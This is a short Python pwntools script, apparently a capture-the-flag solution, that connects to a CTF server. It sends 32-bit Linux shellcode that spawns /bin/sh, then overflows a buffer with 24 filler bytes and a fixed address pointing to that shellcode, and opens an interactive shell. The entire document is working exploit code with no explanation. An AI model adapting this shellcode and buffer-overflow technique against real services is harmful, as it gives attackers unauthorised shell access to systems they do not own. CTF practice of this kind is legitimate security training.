from pwn import *
r=remote("ctf.j0n9hyun.xyz", 3003)

sr = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

shellinhere = 0x0804a060

r.recvuntil(":")
r.sendline(sr)
r.recvuntil(":")

payload = "a"*24+p32(shellinhere)

r.sendline(payload)

r.interactive()
